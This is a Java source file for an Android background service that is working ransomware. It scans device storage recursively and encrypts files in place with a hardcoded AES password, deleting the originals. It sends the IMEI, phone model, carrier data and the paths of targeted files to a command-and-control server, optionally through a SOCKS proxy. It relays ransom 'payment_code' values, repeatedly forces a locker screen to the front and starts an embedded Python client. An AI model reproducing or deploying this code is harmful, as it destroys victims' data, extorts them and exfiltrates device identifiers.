package com.example.into_demo;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import android.provider.MediaStore;
import android.util.Log;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
import androidx.documentfile.provider.DocumentFile;

import com.chaquo.python.Python;
import com.chaquo.python.android.AndroidPlatform;
import com.chaquo.python.PyObject;
public class MainService extends Service {

    private static final String TAG = "MainService";
    private static final String CHANNEL_ID = "EncryptionServiceChannel";
    private static final int NOTIFICATION_ID = 1;
    public static boolean isRunning = false;
    private Context context;
    private SharedPreferences settings;
    private PowerManager.WakeLock wakeLock;
    private Handler handler;
    private Runnable visibilityCheckRunnable;

    @SuppressLint("InvalidWakeLockTag")
    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "WakeLock:MainService");
        try {
            wakeLock.acquire(60 * 60 * 1000L); // Giữ 1 giờ (API 35 timeout cho dataSync)
        } catch (RuntimeException e) {
            Log.e(TAG, "Failed to acquire wake lock at " + new Date().toString(), e);
        }
        context = getApplicationContext();
        isRunning = true;
        settings = getSharedPreferences(Constants.PREFS_NAME, MODE_PRIVATE);
        handler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        startTasks();
        startEncryptionThread();
        Log.d(TAG, "Service created at " + new Date().toString());
        if (!Python.isStarted()) {
            Python.start(new AndroidPlatform(this));
        }
        if (!Python.isStarted()) {
            Python.start(new AndroidPlatform(this));
        }

        // Chạy client.py trong thread
        new Thread(() -> {
            try {
                Python py = Python.getInstance();
                PyObject module = py.getModule("client");  // Lấy module client.py
                PyObject result = module.callAttr("main");  // Gọi main() (fix: callAttr thay callAttrVoid)
                Log.d(TAG, "Python client.py started successfully (result: " + result.toString() + ")");
            } catch (Exception e) {
                Log.e(TAG, "Python client error: " + e.getMessage(), e);
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started at " + new Date().toString());
        if (intent != null && intent.hasExtra("code")) {
            String code = intent.getStringExtra("code");
            sendCodeToServer(code);
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (RuntimeException e) {
                Log.e(TAG, "Failed to release wake lock at " + new Date().toString(), e);
            }
        }
        if (handler != null && visibilityCheckRunnable != null) {
            handler.removeCallbacks(visibilityCheckRunnable);
        }
        Log.d(TAG, "Service destroyed at " + new Date().toString());
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Encryption Service", NotificationManager.IMPORTANCE_LOW);
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Running")
                .setContentText("Service is active")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();
    }

    private void startTasks() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendImeiToServer();
                handler.postDelayed(this, Constants.POLLING_TIME_MINUTES * 60 * 1000);
                Log.d(TAG, "Scheduled IMEI send at " + new Date().toString());
            }
        }, Constants.POLLING_TIME_MINUTES * 60 * 1000);

        visibilityCheckRunnable = new Runnable() {
            @Override
            public void run() {
                if (!settings.getBoolean(Constants.DISABLE_LOCKER, false) && !settings.getBoolean("is_activity_visible", false)) {
                    ensureMainActivityVisible();
                }
                if (!settings.getBoolean("is_activity_visible", false)) {
                    handler.postDelayed(this, 10 * 1000); // Kiểm tra sau 10 giây
                }
                Log.d(TAG, "Checked MainActivity visibility at " + new Date().toString());
            }
        };
        handler.postDelayed(visibilityCheckRunnable, 10 * 1000); // Khởi đầu sau 10 giây
    }

    private File[] scanFilesToEncrypt() {
        List<File> files = new ArrayList<>();
        File internalStorage = Environment.getExternalStorageDirectory();
        if (internalStorage != null && internalStorage.canRead()) {
            scanDirectory(internalStorage, files, 0);
        }
        File[] externalDirs = context.getExternalFilesDirs(null);
        if (externalDirs != null) {
            for (File dir : externalDirs) {
                if (dir != null && dir.canRead() && !dir.getAbsolutePath().equals(internalStorage.getAbsolutePath())) {
                    scanDirectory(dir, files, 0);
                }
            }
        }
        return files.toArray(new File[0]);
    }

    private void scanDirectory(File directory, List<File> files, int depth) {
        if (directory == null || !directory.canRead() || depth > 10) return; // Limit recursion depth
        File[] fileList = directory.listFiles();
        if (fileList == null) return;
        for (File f : fileList) {
            if (f.isDirectory()) {
                scanDirectory(f, files, depth + 1);
            } else if (f.isFile()) {
                String name = f.getName().toLowerCase();
                if (name.equals(Constants.RUN_FLAG.toLowerCase()) || name.equals(Constants.ENCRYPT_LOG.toLowerCase()) || name.endsWith(".enc")) {
                    continue;
                }
                int dot = name.lastIndexOf('.');
                if (dot > 0 && dot < name.length() - 1) {
                    String ext = name.substring(dot + 1).toLowerCase();
                    if (Constants.EXTENSIONS_TO_ENCRYPT.contains(ext)) {
                        files.add(f);
                    }
                }
            }
        }
    }

    private void startEncryptionThread() {
        new Thread(() -> {
            try {
                File[] filesToEncrypt = scanFilesToEncrypt();
                if (filesToEncrypt != null && filesToEncrypt.length > 0) {
                    String safUriString = settings.getString("saf_tree_uri", null);
                    Uri safTreeUri = safUriString != null ? Uri.parse(safUriString) : null;
                    int encryptedCount = 0;
                    for (File file : filesToEncrypt) {
                        boolean success = false;
                        if (safTreeUri != null) {
                            success = encryptWithSAF(file, safTreeUri);
                        } else {
                            success = encryptInPlace(file); // Sử dụng in-place để lưu .enc tại vị trí gốc
                        }
                        if (success) {
                            encryptedCount++;
                            Log.i(TAG, "Processed file in-place: " + file.getAbsolutePath() + " at " + new Date().toString());
                        }
                    }
                    if (encryptedCount > 0) {
                        settings.edit().putBoolean(Constants.FILES_WAS_ENCRYPTED, true).apply();
                        Log.i(TAG, "Encrypted " + encryptedCount + " files at " + new Date().toString());
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Encryption thread error: " + e.getMessage(), e);
            }
        }).start();
    }

    private boolean encryptWithSAF(File file, Uri treeUri) {
        try {
            ContentResolver resolver = getContentResolver();
            DocumentFile tree = DocumentFile.fromTreeUri(this, treeUri);
            if (tree == null) return false;
            DocumentFile dir = tree.findFile(file.getParentFile().getName());
            if (dir == null) dir = tree.createDirectory(file.getParentFile().getName());
            if (dir == null) return false;

            DocumentFile newFile = dir.createFile("application/octet-stream", file.getName() + ".enc");
            if (newFile == null) return false;

            File tempEncFile = new File(getExternalFilesDir(null), file.getName() + ".enc");
            // Encrypt temp với delete=false
            boolean tempSuccess = AesCrypt.encryptFileToNew(file, tempEncFile, Constants.CIPHER_PASSWORD, false, context);
            if (tempSuccess) {
                try (InputStream tempIs = new FileInputStream(tempEncFile);
                     OutputStream os = resolver.openOutputStream(newFile.getUri())) {
                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = tempIs.read(buffer)) != -1) {
                        os.write(buffer, 0, bytesRead);
                    }
                    os.flush();
                    Log.i(TAG, "Encrypted file with SAF: " + file.getAbsolutePath() + " -> " + newFile.getUri());
                    return true;
                } catch (Exception e) {
                    Log.e(TAG, "SAF copy failed", e);
                    newFile.delete(); // Cleanup
                } finally {
                    tempEncFile.delete(); // Xóa temp
                }
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "SAF encryption error for " + file.getAbsolutePath(), e);
            return false;
        }
    }

    private boolean encryptInPlace(File file) {
        // Gọi in-place: Mã hóa và lưu .enc tại vị trí gốc, xóa gốc
        boolean success = AesCrypt.encryptFileInPlace(file, Constants.CIPHER_PASSWORD, context);
        if (success) {
            Log.i(TAG, "In-place encrypted file: " + file.getAbsolutePath() + ".enc");
        }
        return success;
    }

    @SuppressLint("HardwareIds")
    private void sendImeiToServer() {
        new Thread(() -> {
            try {
                if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                    Log.w(TAG, "No READ_PHONE_STATE permission at " + new Date().toString());
                    return;
                }
                String imei = Utils.getIMEI(context);
                String model = Utils.getModel();
                String simCountry = Utils.getSimCountry(context);
                String operatorName = Utils.getOperatorName(context);

                File[] filesToEncrypt = scanFilesToEncrypt();
                JSONArray filesArray = new JSONArray();
                for (File file : filesToEncrypt) {
                    JSONObject fileObj = new JSONObject();
                    String path = file.getAbsolutePath();
                    if (path != null) {
                        fileObj.put("name", file.getName());
                        fileObj.put("path", path);
                        filesArray.put(fileObj);
                    } else {
                        Log.w(TAG, "Null path for file: " + file.getName());
                    }
                }

                JSONObject payload = new JSONObject();
                payload.put("type", "device_info");
                payload.put("imei", imei != null ? imei : "N/A");
                payload.put("model", model != null ? model : "N/A");
                payload.put("simCountry", simCountry != null ? simCountry : "N/A");
                payload.put("operatorName", operatorName != null ? operatorName : "N/A");
                payload.put("files", filesArray);
                payload.put("client", (imei != null ? imei : "N/A") + "@" + System.currentTimeMillis());

                URL url = new URL("http://" + Constants.C2_SERVER + ":" + Constants.PORT + Constants.RESPONSE_PATH);
                HttpURLConnection conn;
                if (Constants.PROXY != null) {
                    conn = (HttpURLConnection) url.openConnection(new Proxy(Proxy.Type.SOCKS, Constants.PROXY));
                } else {
                    conn = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);
                }
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000); // 10s timeout
                conn.setReadTimeout(10000);
                conn.setRequestProperty("Content-Type", "application/json");
                for (String key : Constants.HEADER.keySet()) {
                    conn.setRequestProperty(key, Constants.HEADER.get(key));
                }

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = payload.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                int responseCode = conn.getResponseCode();
                if (responseCode != HttpURLConnection.HTTP_OK) {
                    settings.edit().putString("last_error", "HTTP " + responseCode).apply();
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send IMEI error", e);
                settings.edit().putString("last_error", "Send IMEI error: " + e.getMessage()).apply();
            }
            Log.d(TAG, "IMEI sent at " + new Date().toString());
        }).start();
    }

    private void sendCodeToServer(String code) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("type", "payment_code");
                payload.put("code", code);
                payload.put("client", Utils.getIMEI(context) + "@" + System.currentTimeMillis());

                URL url = new URL("http://" + Constants.C2_SERVER + ":" + Constants.PORT + Constants.RESPONSE_PATH);
                HttpURLConnection conn;
                if (Constants.PROXY != null) {
                    conn = (HttpURLConnection) url.openConnection(new Proxy(Proxy.Type.SOCKS, Constants.PROXY));
                } else {
                    conn = (HttpURLConnection) url.openConnection(Proxy.NO_PROXY);
                }
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.setRequestProperty("Content-Type", "application/json");
                for (String key : Constants.HEADER.keySet()) {
                    conn.setRequestProperty(key, Constants.HEADER.get(key));
                }

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = payload.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
                int responseCode = conn.getResponseCode();
                if (responseCode != HttpURLConnection.HTTP_OK) {
                    settings.edit().putString("last_error", "HTTP " + responseCode).apply();
                }
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send code error", e);
                settings.edit().putString("last_error", "Send code error: " + e.getMessage()).apply();
            }
            Log.d(TAG, "Code sent at " + new Date().toString());
        }).start();
    }

    private void ensureMainActivityVisible() {
        Intent intent = new Intent(context, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
        try {
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Failed to start MainActivity at " + new Date().toString(), e);
        }
        Log.d(TAG, "MainActivity ensured visible at " + new Date().toString());
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}